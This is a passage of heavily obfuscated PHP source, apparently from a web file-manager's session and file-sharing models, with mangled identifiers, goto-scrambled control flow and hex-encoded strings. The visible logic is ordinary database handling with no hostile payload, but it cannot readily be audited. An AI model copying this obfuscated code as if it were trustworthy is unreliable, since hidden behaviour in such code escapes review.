$cšš¤Ãµ§‡ = array(); goto cğ‹ŞºîØœ; cğ‹ŞºîØœ: foreach ($Eã¡³èŠµí as &$D¤·è”İÅÙ) { goto Aô±Ë„Ÿ¦æ; Aô±Ë„Ÿ¦æ: Hook::trigger($eˆ ¡åìÂ[555], $D¤·è”İÅÙ); $D¤·è”İÅÙ[$eˆ ¡åìÂ[87]] = $BÉÓ¡ğ×Ïò->getPathInner($D¤·è”İÅÙ[$eˆ ¡åìÂ[87]]); $C¯®©âİÕ = $BÉÓ¡ğ×Ïò->hashSimple($D¤·è”İÅÙ[$eˆ ¡åìÂ[87]]); goto aäˆ¦ËÀ; aäˆ¦ËÀ: $Bª†¢Şª = $BÉÓ¡ğ×Ïò->hashMd5($D¤·è”İÅÙ[$eˆ ¡åìÂ[87]]); if (strlen($Bª†¢Şª) > 10 && !isset($cšš¤Ãµ§‡[$Bª†¢Şª])) { $cšš¤Ãµ§‡[$Bª†¢Şª] = array(); } $D¤·è”İÅÙ[$eˆ ¡åìÂ[176]] = $C¯®©âİÕ; goto Aà©åÉ¨ä; AÎŠ…×ğØŸ: if (count($cšš¤Ãµ§‡[$Bª†¢Şª]) > 1) { $D¤·è”İÅÙ[$eˆ ¡åìÂ[554]] = !0; } goto EÔÚ‰±ùö½; Aà©åÉ¨ä: $D¤·è”İÅÙ[$eˆ ¡åìÂ[175]] = $Bª†¢Şª; Hook::trigger($eˆ ¡åìÂ[556], $D¤·è”İÅÙ); $cšš¤Ãµ§‡[$Bª†¢Şª][] =& $D¤·è”İÅÙ; goto AÎŠ…×ğØŸ; EÔÚ‰±ùö½: } $DËŠÊË… = array($eˆ ¡åìÂ[175] => array($eˆ ¡åìÂ[17], array_keys($cšš¤Ãµ§‡))); $F‰¥ƒ»Í±® = Model($eˆ ¡åìÂ[557]); goto B·Ü´¡×çµ; b«©Ô‡—ã: foreach ($dƒ¡êç¸š° as $e¹ö¢ö®) { if (!isset($cšš¤Ãµ§‡[$e¹ö¢ö®[$eˆ ¡åìÂ[175]]])) { continue; } $Aß¡›š•ÂÂ =& $cšš¤Ãµ§‡[$e¹ö¢ö®[$eˆ ¡åìÂ[175]]]; foreach ($Aß¡›š•ÂÂ as &$D¤·è”İÅÙ) { $D¤·è”İÅÙ[$eˆ ¡åìÂ[430]] = $e¹ö¢ö®[$eˆ ¡åìÂ[430]]; } unset($D¤·è”İÅÙ); } $BÏ¢Š¾íëô = array(); foreach ($Eã¡³èŠµí as $A£Š‰½¥›) { $BÏ¢Š¾íëô[$A£Š‰½¥›[$eˆ ¡åìÂ[38]]] = $A£Š‰½¥›; } goto a…†ìÄ »Å; a…†ìÄ »Å: return $BÏ¢Š¾íëô; goto Eô‹—È•Î; Eô‹—È•Î: } } goto E…ÛóËîÁŒ; D¸…—ÕİŒ: class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\x6d\137\163\145\163\x73\151\x6f\x6e"; public function get($AÜ•‹‹¾½—) { $fµª´·“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÌÁ©ô†Œˆ = $this->where(array($fµª´·“[2216] => $AÜ•‹‹¾½—))->find(); if (!is_array($eÌÁ©ô†Œˆ)) { return !1; } return $eÌÁ©ô†Œˆ[$fµª´·“[687]]; } public function set($dš‰ÄÍ‡¸, $BóŒÇ±°·³, $E…ÉÑ¬Øˆ = 3600) { $FäâËõãÑ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F­áÃ¼Î = array($FäâËõãÑ[2216] => $dš‰ÄÍ‡¸, $FäâËõãÑ[2128] => $BóŒÇ±°·³, $FäâËõãÑ[2217] => $E…ÉÑ¬Øˆ + time()); if (Session::get($FäâËõãÑ[2218])) { $F­áÃ¼Î[$FäâËõãÑ[1427]] = Session::get($FäâËõãÑ[2218]); } else { $F­áÃ¼Î[$FäâËõãÑ[1427]] = 0; } if ($this->get($dš‰ÄÍ‡¸)) { return $this->where(array($FäâËõãÑ[2216] => $dš‰ÄÍ‡¸))->save($F­áÃ¼Î); } else { return $this->add($F­áÃ¼Î, array(), !0); } } public function remove($a¾¦µé®Ô) { return $this->where(array($_SERVER[¹÷ˆ§éÒ°ú][2216] => $a¾¦µé®Ô))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¹÷ˆ§éÒ°ú][2219] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\x54\151\155\145", "\164\151\155\145", "\x69\156\163\x65\x72\164\x2c\x75\160\144\141\x74\x65", "\x66\x75\x6e\x63\x74\151\157\156"), array("\x63\162\145\141\x74\x65\x54\x69\155\145", "\164\x69\155\x65", "\x69\x6e\x73\x65\162\164", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\x6f\160\164\x69\157\156\163", '', "\x69\x6e\x73\x65\x72\164\54\x75\160\x64\x61\164\x65\x2c\163\145\x6c\145\x63\x74", "\152\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($b ØºãÏ¤ö) { $Eªˆ¿Î’½ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FªÊ·ğÀİÚ = isset($b ØºãÏ¤ö[0]) ? $b ØºãÏ¤ö[0] : !1; return array($Eªˆ¿Î’½[2220] => array(USER_ID, $Eªˆ¿Î’½[2221]), $Eªˆ¿Î’½[2169] => array($FªÊ·ğÀİÚ, $Eªˆ¿Î’½[2222])); } protected function listSimple() { $c±®Ê“Œƒ = array($_SERVER[¹÷ˆ§éÒ°ú][1427] => USER_ID); $döçÍ£‹À = $this->field($this->fieldList)->where($c±®Ê“Œƒ)->select(); return $döçÍ£‹À ? $döçÍ£‹À : array(); } protected function getInfo($CÛŠ„Ñ‰±´, $F¦ÂéÎĞ¢¹ = false) { $F•õÁ£¦ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($F¦ÂéÎĞ¢¹) { return $this->_getShareInfo(array($F•õÁ£¦[452] => $CÛŠ„Ñ‰±´)); } $A—™ æ¶ƒ‹ = $this->cacheFunctionGet($F•õÁ£¦[2223], $CÛŠ„Ñ‰±´); return $A—™ æ¶ƒ‹; } public function getInfoByHash($d˜×–íÅÃº) { return $this->_getShareInfo(array($_SERVER[¹÷ˆ§éÒ°ú][454] => $d˜×–íÅÃº)); } public function getInfoByPath($CÆ÷‹Â¬ó) { $DáèŠÀë =& $_SERVER[¹÷ˆ§éÒ°ú]; $Dù ÄÅÉŞµ = array($DáèŠÀë[1427] => USER_ID, $DáèŠÀë[380] => $CÆ÷‹Â¬ó); return $this->_getShareInfo($Dù ÄÅÉŞµ); } public function getInfoBySourcePath($e›¬Ğ‘ÒÌ½) { $C®©ô—‹Ç =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÍ‚ÂæŒ»’ = array($C®©ô—‹Ç[1427] => USER_ID, $C®©ô—‹Ç[1010] => $e›¬Ğ‘ÒÌ½); return $this->_getShareInfo($FÍ‚ÂæŒ»’); } private function _getShareInfo($fçÀóêìø—) { goto dÎš¹¯¯¬Á; B„¡‡Ñë­´: $fçÀóêìø— = array($e»¿°ßµ¾[452] => $d«·ëĞÆ”°[$e»¿°ßµ¾[452]]); $Fã…•ùã = $e»¿°ßµ¾[2224]; $c„àŸ²äíÑ = Model($e»¿°ßµ¾[550])->order($e»¿°ßµ¾[378])->field($Fã…•ùã)->where($fçÀóêìø—)->select(); goto bÈÌø¸Û“; dÎš¹¯¯¬Á: $e»¿°ßµ¾ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d«·ëĞÆ”° = $this->where($fçÀóêìø—)->find(); if (!$d«·ëĞÆ”°) { return !1; } goto B„¡‡Ñë­´; bÈÌø¸Û“: if ($d«·ëĞÆ”°[$e»¿°ßµ¾[380]] == $e»¿°ßµ¾[481]) { $d«·ëĞÆ”°[$e»¿°ßµ¾[402]] = IO::info($d«·ëĞÆ”°[$e»¿°ßµ¾[1010]]); } else { $d«·ëĞÆ”°[$e»¿°ßµ¾[402]] = Model($e»¿°ßµ¾[1108])->pathInfo($d«·ëĞÆ”°[$e»¿°ßµ¾[380]]); } $d«·ëĞÆ”°[$e»¿°ßµ¾[2225]] = $c„àŸ²äíÑ; return $d«·ëĞÆ”°; goto E‡èÎ³–Çé; E‡èÎ³–Çé: } protected function getInfoAuth($D§‘ÁÂ¡ˆ®) { $eŠø¿¸õî· =& $_SERVER[¹÷ˆ§éÒ°ú]; $A½Ş¡ôÇ³Ğ = $this->getInfo($D§‘ÁÂ¡ˆ®); $A½Ş¡ôÇ³Ğ[$eŠø¿¸õî·[387]] = Model($eŠø¿¸õî·[467])->authMake($A½Ş¡ôÇ³Ğ[$eŠø¿¸õî·[2225]]); return $A½Ş¡ôÇ³Ğ; } protected function listData($aİÍ‹å³ = null, $Eçª±–˜®² = 300) { $cÇæËòæô =& $_SERVER[¹÷ˆ§éÒ°ú]; $Cƒê„¥î« = array(array($cÇæËòæô[457] => array($cÇæËòæô[916], 0), $cÇæËòæô[459] => array($cÇæËòæô[916], 0), $cÇæËòæô[2226] => $cÇæËòæô[2183])); if ($aİÍ‹å³ == $cÇæËòæô[1864]) { $Cƒê„¥î« = array($cÇæËòæô[457] => 1); } else { if ($aİÍ‹å³ == $cÇæËòæô[999]) { $Cƒê„¥î« = array($cÇæËòæô[459] => 1); } } $Cƒê„¥î«[$cÇæËòæô[1427]] = USER_ID; $eÑ´Šª÷â— = $this->where($Cƒê„¥î«)->selectPage($Eçª±–˜®²); return $eÑ´Šª÷â—; } protected function listToMe($fâÈ±Ãƒá = 300) { goto côÏŞ·—; côÏŞ·—: $Cã¾ÁÛÕõ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÉ„¬Ê‡Íé = Session::get($Cã¾ÁÛÕõ[2227]); $CìÍÉØˆˆÄ = array_to_keyvalue($eÉ„¬Ê‡Íé, $Cã¾ÁÛÕõ[43], $Cã¾ÁÛÕõ[2098]); goto fà² Ó˜; a•¿É¾œÆÄ: $aÌÎÄç¬İ = array_to_keyvalue_group($E¹¢Ê»·§¹[$Cã¾ÁÛÕõ[365]], $Cã¾ÁÛÕõ[452]); if (!$aÌÎÄç¬İ) { return $E¹¢Ê»·§¹; } $d¨¹‹ë×šµ = $Cã¾ÁÛÕõ[2228]; goto féÔ‰©…‹; CŸëà¤İÃ: $aµÕÍÒÉ¶ = array($Cã¾ÁÛÕõ[2229] => $fùÎø¸Á‹Ä, $Cã¾ÁÛÕõ[2230] => $E¹¢Ê»·§¹[$Cã¾ÁÛÕõ[362]]); return $aµÕÍÒÉ¶; goto f¦¹µÇŠ; fà² Ó˜: $DïÔåÌÇª = array($Cã¾ÁÛÕõ[534] => SourceModel::TYPE_USER, $Cã¾ÁÛÕõ[469] => USER_ID); if ($CìÍÉØˆˆÄ) { $DïÔåÌÇª = array(array($Cã¾ÁÛÕõ[534] => SourceModel::TYPE_USER, $Cã¾ÁÛÕõ[469] => USER_ID), array($Cã¾ÁÛÕõ[534] => SourceModel::TYPE_GROUP, $Cã¾ÁÛÕõ[469] => array($Cã¾ÁÛÕõ[17], $CìÍÉØˆˆÄ)), $Cã¾ÁÛÕõ[2226] => $Cã¾ÁÛÕõ[2183]); } $E¹¢Ê»·§¹ = Model($Cã¾ÁÛÕõ[550])->where($DïÔåÌÇª)->selectPage($fâÈ±Ãƒá); goto a•¿É¾œÆÄ; féÔ‰©…‹: $DïÔåÌÇª = array($Cã¾ÁÛÕõ[452] => array($Cã¾ÁÛÕõ[395], array_keys($aÌÎÄç¬İ))); $fùÎø¸Á‹Ä = $this->field($d¨¹‹ë×šµ)->where($DïÔåÌÇª)->select(); foreach ($fùÎø¸Á‹Ä as $b­±À§°ìƒ => &$DùË÷„Æ™Ä) { $DùË÷„Æ™Ä[$Cã¾ÁÛÕõ[2225]] = $aÌÎÄç¬İ[$DùË÷„Æ™Ä[$Cã¾ÁÛÕõ[452]]]; } goto CŸëà¤İÃ; f¦¹µÇŠ: } protected function shareAdd($bõ»‡—çò, $Bí˜ôí°ÇÆ) { $CõóƒÅ‰ì© =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fø÷ß† ø = $this->_addShareData($bõ»‡—çò, $Bí˜ôí°ÇÆ); if (!empty($Bí˜ôí°ÇÆ[$CõóƒÅ‰ì©[2231]])) { $this->_shareAuthSet($Fø÷ß† ø, $Bí˜ôí°ÇÆ[$CõóƒÅ‰ì©[2231]]); } $this->shareEventAdd($bõ»‡—çò, $Bí˜ôí°ÇÆ, $CõóƒÅ‰ì©[1002]); return $Fø÷ß† ø; } private function shareEventAdd($føËé³Œ—, $b÷ö”›«ÂĞ, $BÂÂ”Êò‘‰ = "\141\144\144") { goto F§¨Ÿã‡„“; a÷¤›¸±©í: if ($f²‰ÏÄƒï”[$b˜™„ùÉ®‰[459]] == $b˜™„ùÉ®‰[481] && $b÷ö”›«ÂĞ[$b˜™„ùÉ®‰[459]] == $b˜™„ùÉ®‰[95]) { $bÓ‡’‹Ñã‘ = $b˜™„ùÉ®‰[2233]; } if ($f²‰ÏÄƒï”[$b˜™„ùÉ®‰[459]] == $b˜™„ùÉ®‰[95] && $b÷ö”›«ÂĞ[$b˜™„ùÉ®‰[459]] == $b˜™„ùÉ®‰[481]) { $bÓ‡’‹Ñã‘ = $b˜™„ùÉ®‰[2236]; } Model($b˜™„ùÉ®‰[518])->eventShare($føËé³Œ—, $bÓ‡’‹Ñã‘); goto EøªŠÉŸ¸ò; bæ÷–é…Ùù: $bÓ‡’‹Ñã‘ = $b˜™„ùÉ®‰[2234]; if ($f²‰ÏÄƒï”[$b˜™„ùÉ®‰[457]] == $b˜™„ùÉ®‰[481] && $b÷ö”›«ÂĞ[$b˜™„ùÉ®‰[457]] == $b˜™„ùÉ®‰[95]) { $bÓ‡’‹Ñã‘ = $b˜™„ùÉ®‰[2232]; } if ($f²‰ÏÄƒï”[$b˜™„ùÉ®‰[457]] == $b˜™„ùÉ®‰[95] && $b÷ö”›«ÂĞ[$b˜™„ùÉ®‰[457]] == $b˜™„ùÉ®‰[481]) { $bÓ‡’‹Ñã‘ = $b˜™„ùÉ®‰[2235]; } goto a÷¤›¸±©í; F§¨Ÿã‡„“: $b˜™„ùÉ®‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($BÂÂ”Êò‘‰ == $b˜™„ùÉ®‰[1002]) { if ($b÷ö”›«ÂĞ[$b˜™„ùÉ®‰[457]] == $b˜™„ùÉ®‰[95]) { Model($b˜™„ùÉ®‰[518])->eventShare($føËé³Œ—, $b˜™„ùÉ®‰[2232]); } if ($b÷ö”›«ÂĞ[$b˜™„ùÉ®‰[459]] == $b˜™„ùÉ®‰[95]) { Model($b˜™„ùÉ®‰[518])->eventShare($føËé³Œ—, $b˜™„ùÉ®‰[2233]); } return; } $f²‰ÏÄƒï” = $this->getInfoByPath($føËé³Œ—); goto bæ÷–é…Ùù; EøªŠÉŸ¸ò: return; goto bçÛ©ñ„˜°; bçÛ©ñ„˜°: } private function _addShareData($E“ñè¡§ŞŞ, $f¤àÜ·¯Ö… = array()) { goto e¹ ¨ÒÌƒ·; dÕ†ÈİÔ²: $bÈÇ«µÇÅ = $this->add($F“šÃñğÌĞ); $B£öÏ«ë¬ = array($b´ô¡Ú¨ò[454] => short_id($bÈÇ«µÇÅ)); $this->where(array($b´ô¡Ú¨ò[451] => $bÈÇ«µÇÅ))->save($B£öÏ«ë¬); goto d§Œ‡óÉç; cš©Ï´º¥: if ($F’·åË†Ú¶ = $this->where($dš„«ÊÂ‹)->find()) { return $F’·åË†Ú¶[$b´ô¡Ú¨ò[452]]; } if ($E“ñè¡§ŞŞ == 0) { $d˜”çñö·¯ = array($b´ô¡Ú¨ò[38] => get_path_this($f¤àÜ·¯Ö…[$b´ô¡Ú¨ò[87]])); } else { $d˜”çñö·¯ = Model($b´ô¡Ú¨ò[747])->sourceInfo($E“ñè¡§ŞŞ); if (!$d˜”çñö·¯) { return !1; } } if (!$f¤àÜ·¯Ö…[$b´ô¡Ú¨ò[1332]]) { $f¤àÜ·¯Ö…[$b´ô¡Ú¨ò[1332]] = $d˜”çñö·¯[$b´ô¡Ú¨ò[38]]; } goto e™²ç¨ËÈì; e™²ç¨ËÈì: $F“šÃñğÌĞ = array($b´ô¡Ú¨ò[1418] => USER_ID, $b´ô¡Ú¨ò[394] => $E“ñè¡§ŞŞ, $b´ô¡Ú¨ò[1332] => $b´ô¡Ú¨ò[43], $b´ô¡Ú¨ò[457] => 0, $b´ô¡Ú¨ò[459] => 0, $b´ô¡Ú¨ò[1010] => $b´ô¡Ú¨ò[43], $b´ô¡Ú¨ò[306] => $b´ô¡Ú¨ò[43], $b´ô¡Ú¨ò[792] => $b´ô¡Ú¨ò[43], $b´ô¡Ú¨ò[2238] => 0, $b´ô¡Ú¨ò[2239] => 0, $b´ô¡Ú¨ò[460] => 0, $b´ô¡Ú¨ò[461] => $b´ô¡Ú¨ò[43], $b´ô¡Ú¨ò[454] => $b´ô¡Ú¨ò[43]); $c«ÛÑÔéÒ = explode($b´ô¡Ú¨ò[57], $b´ô¡Ú¨ò[2240]); foreach ($c«ÛÑÔéÒ as $A‚ŠáŞ•ÙÈ) { if (!isset($f¤àÜ·¯Ö…[$A‚ŠáŞ•ÙÈ])) { continue; } $F“šÃñğÌĞ[$A‚ŠáŞ•ÙÈ] = $f¤àÜ·¯Ö…[$A‚ŠáŞ•ÙÈ]; } goto dÕ†ÈİÔ²; e¹ ¨ÒÌƒ·: $b´ô¡Ú¨ò =& $_SERVER[¹÷ˆ§éÒ°ú]; $dš„«ÊÂ‹ = array($b´ô¡Ú¨ò[394] => $E“ñè¡§ŞŞ, $b´ô¡Ú¨ò[1418] => USER_ID); if ($E“ñè¡§ŞŞ == 0) { $dš„«ÊÂ‹ = array($b´ô¡Ú¨ò[2237] => $f¤àÜ·¯Ö…[$b´ô¡Ú¨ò[1010]], $b´ô¡Ú¨ò[1418] => USER_ID); } goto cš©Ï´º¥; d§Œ‡óÉç: return $bÈÇ«µÇÅ; goto D…ÕòšÌ÷‘; D…ÕòšÌ÷‘: } private function _shareAuthSet($b ØÈîë¤, $b½ÃóéæÍ¶) { goto Fªå¼…¸Ï; EåÃ§’¦: $Eë–äÜÛ‹ø->where(array($AÉ’‘‹§µ[452] => $b ØÈîë¤))->delete(); $eÓ¦¿¯‹¹ = array(); foreach ($b½ÃóéæÍ¶ as $eŒø˜îº) { $FµëÈ¬åà‰ = SourceModel::TYPE_USER; if ($eŒø˜îº[$AÉ’‘‹§µ[382]] == SourceModel::TYPE_GROUP) { $FµëÈ¬åà‰ = SourceModel::TYPE_GROUP; } $cùÔ‚†‹Ò = array($AÉ’‘‹§µ[452] => $b ØÈîë¤, $AÉ’‘‹§µ[382] => $FµëÈ¬åà‰, $AÉ’‘‹§µ[469] => intval($eŒø˜îº[$AÉ’‘‹§µ[469]]), $AÉ’‘‹§µ[2242] => 0, $AÉ’‘‹§µ[2243] => -1); if ($eŒø˜îº[$AÉ’‘‹§µ[2242]]) { $cùÔ‚†‹Ò[$AÉ’‘‹§µ[2242]] = $eŒø˜îº[$AÉ’‘‹§µ[2242]]; } else { if ($eŒø˜îº[$AÉ’‘‹§µ[2243]]) { $cùÔ‚†‹Ò[$AÉ’‘‹§µ[2243]] = $eŒø˜îº[$AÉ’‘‹§µ[2243]]; } } $eÓ¦¿¯‹¹[] = $cùÔ‚†‹Ò; } goto B¥òá™íáê; B¥òá™íáê: return $Eë–äÜÛ‹ø->addAll($eÓ¦¿¯‹¹, array(), !0); goto E‡•È½¸´§; Fªå¼…¸Ï: $AÉ’‘‹§µ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!is_array($b½ÃóéæÍ¶)) { return !1; } $Eë–äÜÛ‹ø = Model($AÉ’‘‹§µ[2241]); goto EåÃ§’¦; E‡•È½¸´§: } public function numViewAdd($CôÀš˜—…Ô) { $bÃ‚™Æ±¿ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÉˆŒ‰ ÍÆ = array($bÃ‚™Æ±¿[451] => $CôÀš˜—…Ô); $this->where($dÉˆŒ‰ ÍÆ)->setAdd($bÃ‚™Æ±¿[2238]); } public function numDownloadAdd($bÕÓ¬ËñÂ) { $bİÑÛÂ¹  =& $_SERVER[¹÷ˆ§éÒ°ú]; $F˜Ù¹ƒÔÔà = array($bİÑÛÂ¹ [451] => $bÕÓ¬ËñÂ); $this->where($F˜Ù¹ƒÔÔà)->setAdd($bİÑÛÂ¹ [2239]); } protected function shareEdit($A×’©²Ñè, $a£øËİŠš) { goto A‡·“š†ğ; c™ìöÈ‘å–: foreach ($a¼Ğ—ªÊô¢ as $D—ù‘ ××Ô) { if (!array_key_exists($D—ù‘ ××Ô, $a£øËİŠš)) { continue; } $CÕÕ†¼‡Ò[$D—ù‘ ××Ô] = $a£øËİŠš[$D—ù‘ ××Ô]; } $this->shareEventAdd($BÑ‘¼«ù[$D¯Ò¸„÷çÖ[380]], $a£øËİŠš, $D¯Ò¸„÷çÖ[2065]); $this->where(array($D¯Ò¸„÷çÖ[451] => $A×’©²Ñè))->save($CÕÕ†¼‡Ò); goto a¦‚›ÊÊâÎ; A‡·“š†ğ: $D¯Ò¸„÷çÖ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BÑ‘¼«ù = $this->getInfo($A×’©²Ñè); if (!$BÑ‘¼«ù) { return !1; } goto Fñ¢Ûœ–ø»; Fñ¢Ûœ–ø»: $this->_checkLinkShare($a£øËİŠš, $BÑ‘¼«ù); $CÕÕ†¼‡Ò = array(); $a¼Ğ—ªÊô¢ = explode($D¯Ò¸„÷çÖ[57], $D¯Ò¸„÷çÖ[2244]); goto c™ìöÈ‘å–; a¦‚›ÊÊâÎ: if (isset($a£øËİŠš[$D¯Ò¸„÷çÖ[2231]])) { $this->_shareAuthSet($A×’©²Ñè, $a£øËİŠš[$D¯Ò¸„÷çÖ[2231]]); } return !0; goto AåßĞÂªÚ; AåßĞÂªÚ: } private function _checkLinkShare($eà´àİÀàä, $EŒÂ»º‡ã˜) { goto Eèè±‡„¼; EÄÂá¨îÖ: $B‡ÓÆ±ãÊà = $this->shareFileMeta($dÀ¼ò©‡Æ…[$FŸ´Ñ„š¾ù[430]]); if (isset($B‡ÓÆ±ãÊà[$FŸ´Ñ„š¾ù[370]]) && $B‡ÓÆ±ãÊà[$FŸ´Ñ„š¾ù[370]] == $FŸ´Ñ„š¾ù[95]) { show_json(LNG($FŸ´Ñ„š¾ù[2247]), !1); } goto CŒá¾ïï; EØœ†¼õ“š: if ($EŒÂ»º‡ã˜[$FŸ´Ñ„š¾ù[402]][$FŸ´Ñ„š¾ù[39]] != $FŸ´Ñ„š¾ù[179]) { $d—±×Ôß¼† = $this->_folderReport($cİ™ÄÊÌÎ); if (!$d—±×Ôß¼†) { return; } show_json(LNG($FŸ´Ñ„š¾ù[2245]) . $FŸ´Ñ„š¾ù[2246] . $d—±×Ôß¼†, !1); } $dÀ¼ò©‡Æ… = Model($FŸ´Ñ„š¾ù[747])->fileInfoGet($EŒÂ»º‡ã˜[$FŸ´Ñ„š¾ù[402]][$FŸ´Ñ„š¾ù[380]]); if (!$dÀ¼ò©‡Æ…) { return; } goto EÄÂá¨îÖ; Eèè±‡„¼: $FŸ´Ñ„š¾ù =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($eà´àİÀàä[$FŸ´Ñ„š¾ù[457]] != $FŸ´Ñ„š¾ù[95]) { return; } $cİ™ÄÊÌÎ = $EŒÂ»º‡ã˜[$FŸ´Ñ„š¾ù[402]][$FŸ´Ñ„š¾ù[380]]; goto EØœ†¼õ“š; CŒá¾ïï: } private function _folderReport($BõÜ†Ñò½) { goto aì®ïàŞ¤Í; F·Î¦Àï: $e¯Öµ‡Û¨ = array_to_keyvalue($fï¯…ğ‚§, $eÏÍÅÍ“‘ƒ[43], $eÏÍÅÍ“‘ƒ[38]); $e¯Öµ‡Û¨[] = $e‰ÑôİÜ…[$eÏÍÅÍ“‘ƒ[38]]; return implode($eÏÍÅÍ“‘ƒ[18], $e¯Öµ‡Û¨); goto C‹Ú·Ìä•ó; AÂÀÏ‚“‰¢: if (!$E•†Ã‡êÁ) { return !1; } $E•†Ã‡êÁ = array_to_keyvalue($E•†Ã‡êÁ, $eÏÍÅÍ“‘ƒ[43], $eÏÍÅÍ“‘ƒ[430]); $D¶¼º–Ï = $eÏÍÅÍ“‘ƒ[57] . $BõÜ†Ñò½ . $eÏÍÅÍ“‘ƒ[57]; goto B¾ÊÈİ©ÑÍ; aì®ïàŞ¤Í: $eÏÍÅÍ“‘ƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Dñ¦®¨ÅóÀ = array($eÏÍÅÍ“‘ƒ[430] => array($eÏÍÅÍ“‘ƒ[916], 0), $eÏÍÅÍ“‘ƒ[684] => 3); $E•†Ã‡êÁ = Model($eÏÍÅÍ“‘ƒ[2248])->where($Dñ¦®¨ÅóÀ)->field($eÏÍÅÍ“‘ƒ[430])->select(); goto AÂÀÏ‚“‰¢; EóÌÚ‡‰ëˆ: $bÉïŸÀõ”­ = substr($e‰ÑôİÜ…[$eÏÍÅÍ“‘ƒ[472]], strpos($e‰ÑôİÜ…[$eÏÍÅÍ“‘ƒ[472]], $D¶¼º–Ï)); $Dñ¦®¨ÅóÀ = array($eÏÍÅÍ“‘ƒ[380] => array($eÏÍÅÍ“‘ƒ[17], trim($bÉïŸÀõ”­, $eÏÍÅÍ“‘ƒ[57]))); $fï¯…ğ‚§ = Model($eÏÍÅÍ“‘ƒ[747])->where($Dñ¦®¨ÅóÀ)->field($eÏÍÅÍ“‘ƒ[38])->select(); goto F·Î¦Àï; B¾ÊÈİ©ÑÍ: $Dñ¦®¨ÅóÀ = array($eÏÍÅÍ“‘ƒ[430] => array($eÏÍÅÍ“‘ƒ[17], $E•†Ã‡êÁ), $eÏÍÅÍ“‘ƒ[472] => array($eÏÍÅÍ“‘ƒ[746], "\x25{$D¶¼º–Ï}\x25"), $eÏÍÅÍ“‘ƒ[408] => 0); $e‰ÑôİÜ… = Model($eÏÍÅÍ“‘ƒ[747])->where($Dñ¦®¨ÅóÀ)->field($eÏÍÅÍ“‘ƒ[2249])->find(); if (!$e‰ÑôİÜ…) { return !1; } goto EóÌÚ‡‰ëˆ; C‹Ú·Ìä•ó: } protected function remove($E¹†Çœê§) { goto fæ¼„ ÷áˆ; fæ¼„ ÷áˆ: $FÓ“¿Äº¾å =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_array($E¹†Çœê§)) { $E¹†Çœê§ = array($FÓ“¿Äº¾å[17], $E¹†Çœê§); } $d´œŸìôï† = array($FÓ“¿Äº¾å[452] => $E¹†Çœê§); goto F…¿†©½™¨; F…¿†©½™¨: $B‡Á¸¨Æ’— = $this->where($d´œŸìôï†)->delete(); if ($B‡Á¸¨Æ’—) { Model($FÓ“¿Äº¾å[550])->where(array($FÓ“¿Äº¾å[452] => $E¹†Çœê§))->delete(); } $bïé¼„µëù = is_array($E¹†Çœê§) ? $E¹†Çœê§[1] : array($E¹†Çœê§); goto E£ÅµØ‰; E£ÅµØ‰: for ($FõÚÊà‚ˆÎ = 0; $FõÚÊà‚ˆÎ < count($bïé¼„µëù); $FõÚÊà‚ˆÎ++) { $Aƒ„­œºšå = $this->getInfo($bïé¼„µëù[$FõÚÊà‚ˆÎ]); if ($Aƒ„­œºšå[$FÓ“¿Äº¾å[459]] == $FÓ“¿Äº¾å[95]) { Model($FÓ“¿Äº¾å[518])->eventShare($Aƒ„­œºšå[$FÓ“¿Äº¾å[380]], $FÓ“¿Äº¾å[2236]); } if ($Aƒ„­œºšå[$FÓ“¿Äº¾å[457]] == $FÓ“¿Äº¾å[95]) { Model($FÓ“¿Äº¾å[518])->eventShare($Aƒ„­œºšå[$FÓ“¿Äº¾å[380]], $FÓ“¿Äº¾å[2235]); } } return $B‡Á¸¨Æ’—; goto e¬µòÉŞ; e¬µòÉŞ: } protected function removeBySource($DÊÃÈ‚ö¯) { goto E”®ÓÚÏ®; C‘¯ßç§Ø: $D‰ÎëÉÄ«‘ = array_to_keyvalue($D‰ÎëÉÄ«‘, $D³‹˜íîÏ[43], $D³‹˜íîÏ[452]); if (!$D‰ÎëÉÄ«‘) { return; } $c‡‚éÌ×ç‰ = array($D³‹˜íîÏ[451] => array($D³‹˜íîÏ[395], $D‰ÎëÉÄ«‘)); goto DğÄ×æÓê; DğÄ×æÓê: $this->where($c‡‚éÌ×ç‰)->delete(); Model($D³‹˜íîÏ[550])->where($c‡‚éÌ×ç‰)->delete(); goto BÉ½İóêÁù; E”®ÓÚÏ®: $D³‹˜íîÏ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c‡‚éÌ×ç‰ = array($D³‹˜íîÏ[394] => array($D³‹˜íîÏ[395], $DÊÃÈ‚ö¯)); $D‰ÎëÉÄ«‘ = $this->field($D³‹˜íîÏ[452])->where($c‡‚éÌ×ç‰)->select(); goto C‘¯ßç§Ø; BÉ½İóêÁù: } public function listAll($f”©‚º‹‡) { goto fÚ ¡ì¹×‹; A—”“èìÄ: $E©ÇˆŠ¸” = $this->_makeOrder()->where($BÓùÕ—êå)->selectPage(20); if (empty($E©ÇˆŠ¸”[$A‡•ï…¶¹[365]])) { return array(); } $this->_listDataApply($E©ÇˆŠ¸”[$A‡•ï…¶¹[365]]); goto cª›£ĞÚ¿; fÚ ¡ì¹×‹: $A‡•ï…¶¹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BÓùÕ—êå = array(); if ($f”©‚º‹‡[$A‡•ï…¶¹[1427]]) { $BÓùÕ—êå[$A‡•ï…¶¹[1427]] = $f”©‚º‹‡[$A‡•ï…¶¹[1427]]; } goto Aº®Ø½·; Aº®Ø½·: if 